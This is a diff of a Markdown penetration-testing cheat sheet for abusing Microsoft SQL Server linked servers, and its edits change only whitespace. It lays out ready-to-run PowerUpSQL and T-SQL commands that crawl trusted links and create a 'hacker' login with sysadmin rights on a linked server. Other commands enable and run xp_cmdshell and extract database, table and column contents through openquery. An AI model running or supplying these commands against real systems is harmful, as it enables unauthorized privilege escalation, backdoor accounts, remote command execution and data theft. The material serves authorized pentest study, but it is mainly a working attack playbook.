@@ -13,14 +13,11 @@
 - [Gather the Top 5 Columns from a Selected Linked Table](#gather-the-top-5-columns-from-a-selected-linked-table)
 - [Gather Entries from a Selected Linked Column](#gather-entries-from-a-selected-linked-column)
 
-
 ## Find Trusted Link
-
 
 ```sql
 select * from master..sysservers
 ```
-
 
 ## Execute Query Through The Link
 
@@ -47,16 +44,14 @@ EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') 
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
 
-## Crawl Links for Instances in the Domain 
+## Crawl Links for Instances in the Domain
 
 A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results
-
 
 ```ps1
 Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
 select * from master..sysservers
 ```
-
 
 ## Crawl Links for a Specific Instance
 
@@ -65,13 +60,11 @@ Get-SQLServerLinkCrawl -Instance "<DBSERVERNAME\DBInstance>" -Verbose
 select * from openquery("<instance>",'select * from openquery("<instance2>",''select * from master..sysservers'')')
 ```
 
-
 ## Query Version of Linked Database
 
 ```ps1
 Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DBSERVERNAME\DBInstance>`",'select @@version')" -Verbose
 ```
-
 
 ## Execute Procedure on Linked Database
 
@@ -83,8 +76,7 @@ SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
 SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
 ```
 
-
-## Determine Names of Linked Databases 
+## Determine Names of Linked Databases
 
 > tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.
 
@@ -92,21 +84,17 @@ SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
 Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from sys.databases')" -Verbose
 ```
 
-
 ## Determine All the Tables Names from a Selected Linked Database
 
 > The result is TableName which feeds into following query
-
 
 ```ps1
 Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from <DatabaseNameFromPreviousCommand>.sys.tables')" -Verbose
 ```
 
-
 ## Gather the Top 5 Columns from a Selected Linked Table
 
 > The results are ColumnName and ColumnValue which feed into following query
-
 
 ```ps1
 Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select TOP 5 * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand>')" -Verbose
@@ -114,8 +102,6 @@ Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openque
 
 ## Gather Entries from a Selected Linked Column
 
-
 ```ps1
 Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`"'select * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand> where <ColumnNameFromPreviousCommand>=<ColumnValueFromPreviousCommand>')" -Verbose
 ```
-
